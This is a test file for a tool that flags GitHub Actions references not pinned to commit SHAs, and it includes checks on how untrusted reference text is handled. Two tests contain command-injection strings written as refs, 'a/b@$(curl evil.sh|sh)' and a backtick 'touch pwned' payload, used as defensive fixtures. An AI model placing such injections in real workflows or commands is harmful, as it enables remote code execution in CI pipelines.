import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { detectActionPinning, extractActionUses, unpinnedUse } from '../src/action-pinning.js';
import { buildRepoContext, isExcludedPath } from '../src/repo-context.js';
import { scan } from '../src/scan.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const FIXTURE = path.resolve(__dirname, '../../../examples/fixture-agent-formats');
const SHA = '0123456789abcdef0123456789abcdef01234567';

function tmpRepo(files: Record<string, string>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'promptci-action-pin-'));
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), body);
  }
  return root;
}

const steps = (...uses: string[]) =>
  ['jobs:', '  t:', '    runs-on: ubuntu-latest', '    steps:', ...uses.map((u) => `      - uses: ${u}`)].join('\n') + '\n';

describe('extractActionUses', () => {
  it('reads step and job-level uses, unquoting and dropping trailing comments', () => {
    const yaml = [
      'jobs:',
      '  a:',
      '    steps:',
      '      - uses: actions/checkout@v4',
      '      - name: x',
      '        uses: "pnpm/action-setup@v4" # pnpm',
      "      - uses: 'owner/repo@main'",
      '  b:',
      '    uses: org/wf/.github/workflows/x.yml@v1',
    ].join('\n');
    expect(extractActionUses(yaml)).toEqual([
      { ref: 'actions/checkout@v4', line: 4 },
      { ref: 'pnpm/action-setup@v4', line: 6 },
      { ref: 'owner/repo@main', line: 7 },
      { ref: 'org/wf/.github/workflows/x.yml@v1', line: 9 },
    ]);
  });

  it('ignores comments and `uses:` text inside block scalars', () => {
    const yaml = [
      'steps:',
      '  # - uses: commented/out@v1',
      '  - run: |',
      '      uses: fake/in-script@v1',
      '      echo done',
      '  - name: folded',
      '    env:',
      '      NOTE: >-',
      '        uses: fake/in-folded@v1',
      '  - uses: real/action@v2',
    ].join('\n');
    expect(extractActionUses(yaml).map((u) => u.ref)).toEqual(['real/action@v2']);
  });

  it('reads flow-mapping steps but not a `uses` nested inside them', () => {
    const yaml = [
      'steps:',
      '  - { uses: flow/action@v1, with: { uses: nested/not-a-step@v9 } }',
      "  - { name: quoted, uses: 'flow/quoted@v2' }",
      '  - { run: echo hi }',
    ].join('\n');
    expect(extractActionUses(yaml).map((u) => u.ref)).toEqual(['flow/action@v1', 'flow/quoted@v2']);
  });

  it('does not count a `uses` key nested under with:/env:', () => {
    const yaml = [
      'steps:',
      '  - uses: real/action@v1',
      '    with:',
      '      uses: input/named-uses@v1',
      '      other: 1',
      '  - name: x',
      '    env:',
      '      uses: env/var@v1',
      '    uses: second/real@v2',
    ].join('\n');
    expect(extractActionUses(yaml).map((u) => u.ref)).toEqual(['real/action@v1', 'second/real@v2']);
  });
});

describe('unpinnedUse', () => {
  const u = (ref: string) => unpinnedUse({ ref, line: 1 });

  it('flags tags and branches', () => {
    expect(u('actions/checkout@v4')?.version).toBe('v4');
    expect(u('owner/repo/sub/path@release/1.x')?.action).toBe('owner/repo/sub/path');
    expect(u('owner/repo@main')?.owner).toBe('owner');
  });

  it('accepts full 40-hex and 64-hex SHAs in either case, not abbreviated ones', () => {
    expect(u(`actions/checkout@${SHA}`)).toBeUndefined();
    expect(u(`actions/checkout@${SHA.toUpperCase()}`)).toBeUndefined();
    expect(u(`actions/checkout@${SHA}${SHA.slice(0, 24)}`)).toBeUndefined();
    expect(u('actions/checkout@0123456')).toBeDefined();
  });

  it('flags a tag whose SHA sits only in the trailing comment', () => {
    const [use] = extractActionUses(`steps:\n  - uses: actions/checkout@v4 # ${SHA}\n`);
    expect(use!.ref).toBe('actions/checkout@v4');
    expect(unpinnedUse(use!)).toBeDefined();
  });

  it('exempts local, docker and expression refs and ignores non-action values', () => {
    expect(u('./.github/actions/setup')).toBeUndefined();
    expect(u('docker://alpine:3.20')).toBeUndefined();
    expect(u('owner/repo@${{ matrix.ref }}')).toBeUndefined();
    expect(u('actions/checkout')).toBeUndefined();
    expect(u('not-a-ref@v1')).toBeUndefined();
  });

  it('marks refs outside the plain owner/repo@ref shape as not displayable', () => {
    expect(u('a/b@$(curl evil.sh|sh)')?.displayable).toBe(false);
    expect(u('a/b@v1`id`')?.displayable).toBe(false);
    expect(u('a b/c@v1')?.displayable).toBe(false);
    expect(u('a/b@v1.2.3')?.displayable).toBe(true);
  });
});

describe('detectActionPinning — fixture-agent-formats', () => {
  it('flags exactly the unpinned remote refs', async () => {
    const context = await buildRepoContext({ repoPath: FIXTURE });
    const issues = detectActionPinning(context);
    const byTitle = Object.fromEntries(issues.map((i) => [i.title, i]));

    expect(issues.map((i) => i.title).sort()).toEqual([
      'GitHub Action `actions/checkout@v4` is not pinned to a commit SHA',
      'GitHub Action `example-org/shared-workflows/.github/workflows/lint.yml@main` is not pinned to a commit SHA',
      'GitHub Action `pnpm/action-setup@v4` is not pinned to a commit SHA',
    ]);

    const checkout = byTitle['GitHub Action `actions/checkout@v4` is not pinned to a commit SHA']!;
    expect(checkout.severity).toBe('info'); // first-party
    expect(checkout.category).toBe('security');
    expect(checkout.tags).toContain('supply-chain');
    expect(checkout.locations).toEqual([
      { filePath: path.join(FIXTURE, '.github', 'workflows', 'ci.yml'), startLine: 11, endLine: 11 },
    ]);
    expect(checkout.evidence).toEqual(['.github/workflows/ci.yml: uses: actions/checkout@v4']);

    const pnpm = byTitle['GitHub Action `pnpm/action-setup@v4` is not pinned to a commit SHA']!;
    expect(pnpm.severity).toBe('warning'); // third-party
  });

  it('is detect-only: no fix recipe, never auto-applied', async () => {
    const issues = detectActionPinning(await buildRepoContext({ repoPath: FIXTURE }));
    expect(issues.length).toBeGreaterThan(0);
    for (const issue of issues) {
      expect(issue.fixRecipe).toBeUndefined();
      expect(issue.autoApplySafe).toBeUndefined();
    }
  });

  it('never lists workflow YAML among the scanned instruction files', async () => {
    const report = await scan({ repoPath: FIXTURE });
    expect(report.filesScanned.some((f) => f.path.endsWith('.yml'))).toBe(false);
    expect(report.issues.some((i) => i.id.startsWith('action-pin-'))).toBe(true);
  });
});

describe('detectActionPinning — one finding per (file, ref)', () => {
  const roots: string[] = [];
  afterAll(() => roots.forEach((r) => fs.rmSync(r, { recursive: true, force: true })));

  it('the same ref in two workflows is two findings; pinning one leaves the other id unchanged', async () => {
    const before = tmpRepo({
      '.github/workflows/a.yml': steps('some/action@v1'),
      '.github/workflows/b.yml': steps('some/action@v1', 'some/action@v1'),
    });
    const after = tmpRepo({
      '.github/workflows/a.yml': steps('some/action@v1'),
      '.github/workflows/b.yml': steps(`some/action@${SHA}`, `some/action@${SHA}`),
    });
    roots.push(before, after);

    const b = detectActionPinning(await buildRepoContext({ repoPath: before }));
    expect(b).toHaveLength(2);
    expect(new Set(b.map((i) => i.id)).size).toBe(2);
    const bFile = b.find((i) => i.evidence[0]!.startsWith('.github/workflows/b.yml'))!;
    expect(bFile.locations.map((l) => l.startLine)).toEqual([5, 6]);

    const a = detectActionPinning(await buildRepoContext({ repoPath: after }));
    expect(a).toHaveLength(1);
    const aBefore = b.find((i) => i.evidence[0]!.startsWith('.github/workflows/a.yml'))!;
    expect(a[0]!.id).toBe(aBefore.id);
    expect(a[0]!.evidence).toEqual(aBefore.evidence);
  });
});

describe('detectActionPinning — untrusted ref text', () => {
  let root: string;
  beforeAll(() => {
    root = tmpRepo({
      '.github/workflows/evil.yml': steps('a/b@$(curl evil.sh|sh)', 'c/d@v1`touch pwned`'),
    });
  });
  afterAll(() => fs.rmSync(root, { recursive: true, force: true }));

  it('still flags the refs but never echoes their raw text', async () => {
    const issues = detectActionPinning(await buildRepoContext({ repoPath: root }));
    expect(issues).toHaveLength(2);
    expect(new Set(issues.map((i) => i.id)).size).toBe(2);
    for (const issue of issues) {
      expect(issue.severity).toBe('warning');
      expect(issue.title).toBe('GitHub Action reference is not pinned to a commit SHA');
      const text = [issue.title, issue.summary, issue.recommendation, ...issue.evidence].join('\n');
      expect(text).not.toContain('curl');
      expect(text).not.toContain('touch');
      expect(text).not.toContain('gh api');
      expect(issue.title).not.toContain('`');
    }
  });
});

describe('detectActionPinning — composite actions, clean and excluded files', () => {
  let root: string;

  beforeAll(() => {
    root = tmpRepo({
      '.github/workflows/pinned.yml': [
        'jobs:',
        '  t:',
        '    steps:',
        `      - uses: actions/checkout@${SHA} # v4`,
        '      - uses: ./.github/actions/local',
        '      - uses: docker://node:22',
      ].join('\n'),
      '.github/workflows/legacy.yml': steps('some/action@v1'),
      '.github/actions/local/action.yml': [
        'name: local',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - uses: composite/step@v3',
        '    - run: echo hi',
        '      shell: bash',
      ].join('\n'),
      'action.yml': ['name: root', 'runs:', '  using: composite', '  steps:', `    - uses: pinned/step@${SHA}`].join('\n'),
    });
  });

  afterAll(() => {
    fs.rmSync(root, { recursive: true, force: true });
  });

  it('audits composite actions under .github/actions and at the root', async () => {
    const issues = detectActionPinning(await buildRepoContext({ repoPath: root }));
    expect(issues.map((i) => i.title).sort()).toEqual([
      'GitHub Action `composite/step@v3` is not pinned to a commit SHA',
      'GitHub Action `some/action@v1` is not pinned to a commit SHA',
    ]);
  });

  it('a fully pinned workflow stays clean', async () => {
    const context = await buildRepoContext({
      repoPath: root,
      exclude: ['.github/workflows/legacy.yml', '.github/actions/**'],
    });
    expect(detectActionPinning(context)).toEqual([]);
  });

  it('honors directory-level exclude patterns, like discovery does', async () => {
    for (const exclude of [['.github'], ['.github/'], ['.github/workflows'], ['.github/workflows/']]) {
      const titles = detectActionPinning(await buildRepoContext({ repoPath: root, exclude })).map((i) => i.title);
      expect(titles, exclude[0]).not.toContain('GitHub Action `some/action@v1` is not pinned to a commit SHA');
    }
    expect(isExcludedPath('.github/workflows/ci.yml', ['.github'])).toBe(true);
    expect(isExcludedPath('.github/workflows/ci.yml', ['.githubx'])).toBe(false);
    expect(isExcludedPath('.github/workflows/ci.yml', [])).toBe(false);
  });

  it('returns nothing when there are no workflows or actions', async () => {
    const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'promptci-action-pin-none-'));
    try {
      expect(detectActionPinning(await buildRepoContext({ repoPath: empty }))).toEqual([]);
    } finally {
      fs.rmSync(empty, { recursive: true, force: true });
    }
  });
});
